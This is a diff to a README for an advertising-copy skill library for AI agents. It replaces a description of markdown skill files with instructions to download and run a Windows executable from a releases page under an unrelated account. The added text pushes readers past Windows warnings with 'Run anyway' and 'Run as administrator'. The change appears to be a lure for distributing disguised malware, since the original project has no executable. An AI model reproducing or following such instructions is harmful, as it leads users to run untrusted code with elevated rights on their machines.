@@ -1,281 +1,200 @@
-# Advertising Skills for AI Agents
+# 📣 advertising-skills - Better Ads, Cleaner Copy, Stronger Results
+
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Noninflammatory-tunny848/advertising-skills/releases)
+
+## 🚀 Getting Started
+
+advertising-skills helps you work with ad copy, direct response ideas, funnels, and campaign systems on Windows. It is built for Open Claw, Claude Code, and AI agents that help with advertising work.
+
+Use it to set up fast workflows for:
+- paid ads
+- landing pages
+- email sequences
+- offer angles
+- copy systems
+- funnel structure
 
-**The direct-response, paid media, and copywriting system for serious operators.**
+## 💻 Windows Download
 
----
+Go to the [release page](https://github.com/Noninflammatory-tunny848/advertising-skills/releases) to download and run this file on Windows.
 
-## Before vs After
+### What to look for
+On the release page, find the latest version and download the Windows file. It may be named like:
+- `advertising-skills.exe`
+- `advertising-skills-windows.zip`
+- a similar Windows build
 
-**Before:**
-“Scale your business with proven strategies”
+If you download a `.zip` file, extract it first, then open the app file inside.
 
-**After:**
-“You’re not bad at ads.  
-You’ve just never been shown how to structure them properly.”
+## 🪟 How to Install on Windows
 
-Same business.  
-Completely different outcome.
+1. Open the [release page](https://github.com/Noninflammatory-tunny848/advertising-skills/releases)
+2. Find the newest release at the top
+3. Download the Windows file
+4. If the file is zipped, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to run it
+7. If Windows asks for permission, choose **More info** and then **Run anyway** only if you trust the file source
 
----
+## 📦 What This Tool Is For
 
-Most AI marketing outputs sound the same.
+This project is for people who want help creating and organizing advertising work. It supports common tasks like:
+- writing ad headlines
+- shaping the core message
+- mapping a funnel
+- building response-focused copy
+- reusing proven ad patterns
+- keeping campaign ideas in one place
 
-Generic.  
-Polished.  
-Forgettable.  
+It fits work across:
+- direct response
+- paid social
+- search ads
+- landing pages
+- lead gen funnels
+- email follow-up
+
+## 🧭 Typical Use Cases
+
+Use advertising-skills when you want to:
+- turn a rough offer into clear ad copy
+- build a funnel from first click to sale
+- write variations for testing
+- create copy systems you can reuse
+- help Claude Code or another agent work with ad prompts
+- keep ad ideas and funnel notes in one workflow
 
-This repository fixes that.
+## 🧰 Basic Requirements
 
-It encodes the thinking behind:
+For smooth use on Windows, you should have:
+- Windows 10 or Windows 11
+- an internet connection for the first download
+- enough free space for the app and its files
+- permission to run downloaded apps
+- a modern browser for the release page
 
-* high-performing ads  
-* high-converting funnels  
-* sharp positioning  
-* and direct-response copy that actually sells  
+For best results:
+- keep Windows updated
+- use a standard desktop or laptop
+- close extra apps if your system feels slow
 
-Not as prompts.
+## ⚙️ First Run
 
-As **skills**.
+After you open the app for the first time:
+- allow it to finish loading
+- read any setup prompts
+- choose your project type if asked
+- point it at your ad, funnel, or copy task
+- save your settings so you can reuse them later
 
----
+If the app offers sample workflows, start with one. That makes it easier to see how it handles ad work.
 
-## What This Is
+## 📝 Suggested Workflow
 
-A best-in-class skill library for AI agents built around:
+A simple way to use advertising-skills:
 
-* Paid acquisition (Meta, TikTok, YouTube)  
-* Eugene Schwartz-style copywriting  
-* Offer design and positioning  
-* Funnel architecture and conversion logic  
-* Creative testing and scaling  
-* Campaign diagnosis and optimisation  
+1. Start with the offer
+2. Define the audience
+3. Choose one goal
+4. Write the main promise
+5. Add proof or support points
+6. Create ad variations
+7. Send traffic to a matching landing page
+8. Review results and refine the message
 
-Each skill is:
+This gives you a clean path from idea to campaign.
 
-* focused  
-* opinionated  
-* reusable  
-* and designed to work together  
+## 🔍 Common Tasks It Can Support
 
----
+### Ad Copy
+Create short ads that focus on one clear benefit, one clear offer, and one clear action.
 
-## Why This Is Different
+### Funnel Mapping
+Plan the steps from ad click to conversion.
 
-Most “AI marketing libraries” optimise for output.
+### Message Angles
+Test different hooks, pain points, and outcomes.
 
-This optimises for **thinking**.
+### Copy Systems
+Build repeatable templates for ads, emails, and pages.
 
-That means:
+### AI Agent Workflows
+Use Claude Code or another agent to help draft, sort, or rewrite campaign content.
 
-* It doesn’t guess the audience — it defines it  
-* It doesn’t write copy first — it builds the strategy first  
-* It doesn’t try to sound smart — it tries to convert  
-* It doesn’t just create — it filters, qualifies, and diagnoses  
+## 🛠️ Troubleshooting
 
-It combines two worlds that are usually separate:
+### The file will not open
+- Make sure the download finished
+- Check that you opened the Windows file
+- If you downloaded a ZIP file, extract it first
 
-### The Copy Chief Brain
+### Windows blocked the app
+- Right-click the file
+- Choose **Run as administrator** if needed
+- Check the file source on the release page
+- Try downloading again from the latest release
 
-* Awareness levels (Eugene Schwartz)  
-* Market sophistication  
-* Mechanisms and big ideas  
-* Headlines, leads, proof, objections, close  
+### The app opens and closes fast
+- Download the file again
+- Make sure all files stayed in the same folder
+- Reboot Windows and try once more
 
-### The Operator Brain
+### The page does not load
+- Refresh your browser
+- Try another browser
+- Check your internet connection
+- Open the release page again later
 
-* Ad creative and angles  
-* Funnel paths and conversion logic  
-* Qualification and filtering  
-* Testing and performance diagnosis  
+## 📁 Project Topics
 
-Most systems have one.
+This repository focuses on:
+- advertising
+- claude-code
+- codex
+- openclaw
+- openclawskill
 
-This has both.
+## 🔗 Download Again
 
----
+If you need the Windows file again, go to the [release page](https://github.com/Noninflammatory-tunny848/advertising-skills/releases) and download and run this file on Windows
 
-## How It Works
+## 🧩 What You Can Build With It
 
-Each skill lives in its own folder:
-skills/<category>/<skill-name>/SKILL.md
+You can use this project to support:
+- ad testing plans
+- offer positioning
+- landing page copy
+- email follow-up sequences
+- funnel steps
+- creative angles
+- response-focused messaging
 
-Each skill defines:
+## 🖥️ File and Folder Tips
 
-* when to use it  
-* what inputs it needs  
-* how it thinks  
-* what it outputs  
-* what it should not do  
+Keep the app in a folder you can find later. A simple setup works best:
+- `Downloads`
+- `Documents`
+- `Desktop`
+- a folder named `advertising-skills`
 
-They are designed to be chained.
+If the app creates files, keep those with the app folder so everything stays together.
 
----
+## 🔐 Safe Download Habits
 
-## Example Flow
+Use the release page link from this repository:
+- check the latest version
+- read the file name before you download
+- keep the files in one folder
+- avoid mixing old and new release files
 
-Building a booked-call campaign:
-avatar-extraction
-→ offer-extraction
-→ schwartz-awareness-mapper
-→ mechanism-builder
-→ ad-angle-multiplier
-→ scroll-stopping-creative
-→ conversion-path-builder
-→ objection-crusher
-→ generic-language-killer
+## 📚 Best Results
 
-This produces:
+You will get better results if you use clear inputs like:
+- product name
+- target audience
+- main benefit
+- offer price
+- proof points
+- call to action
 
-* clear positioning  
-* strong angles  
-* high-performing ads  
-* a clean funnel  
-* and conversion-ready messaging  
-
----
-
-## Example Output
-
-See:
-/examples/booked-call-campaign-ai-ads.md
-
----
-
-## Core Skill Categories
-
-### Foundations
-
-Define reality before writing anything.
-
-* avatar-extraction  
-* voice-of-customer-miner  
-* offer-extraction  
-* proof-harvester  
-* positioning-core  
-
----
-
-### Copy Chief
-
-The Eugene Schwartz layer.
-
-* schwartz-awareness-mapper  
-* market-sophistication-analyzer  
-* dominant-desire-extractor  
-* mechanism-builder  
-* headline-matrix  
-* objection-crusher  
-* close-architect  
-
----
-
-### Operator OS
-
-Execution and scale.
-
-* scroll-stopping-creative  
-* ad-angle-multiplier  
-* conversion-path-builder  
-* landing-page-architect  
-* email-sequence-architect  
-* performance-diagnosis  
-* testing-roadmap  
-
----
-
-### QA
-
-What makes the output actually good.
-
-* generic-language-killer  
-* claim-checker  
-* consistency-auditor  
-* final-polish  
-
----
-
-### Orchestrators
-
-Pre-built multi-skill flows.
-
-* full-funnel-campaign-orchestrator  
-* booked-call-campaign-orchestrator  
-* campaign-diagnosis-orchestrator  
-
----
-
-## Who This Is For
-
-* Media buyers who want better creative and messaging  
-* Founders running paid ads who are tired of guesswork  
-* Agencies who want consistency across teams  
-* Operators building AI-driven marketing systems  
-
----
-
-## What This Is Not
-
-* Not generic content marketing templates  
-* Not “write me 10 captions” prompts  
-* Not surface-level frameworks  
-
-This is built for:
-
-* direct response  
-* paid traffic  
-* real budgets  
-* real consequences  
-
----
-
-## Installation
-
-Compatible with any agent using the Agent Skills pattern.
-
-Install into:
-.agents/skills/
-
-Works with:
-
-* Claude Code  
-* Cursor  
-* Windsurf  
-* Codex  
-* custom agent frameworks
-* Open Claw
-
----
-
-## Philosophy
-
-The future isn’t better prompts.
-
-It’s **better encoded thinking**.
-
----
-
-## Roadmap
-
-* Expanded Copy Chief library (mechanisms, big ideas, proof systems)  
-* Advanced funnel orchestration  
-* Creative testing systems  
-* Platform-specific skill layers (Meta, TikTok, YouTube)  
-
----
-
-## License
-
-MIT
-
----
-
-## Author
-
-Kim Barrett  
-Advertising systems, AI-driven marketing, and direct-response strategy  
-
----
-
-If you use this properly, it won’t just improve your ads.
-
-It will change how you think about them.
+Clear inputs lead to cleaner ad copy and better funnel structure
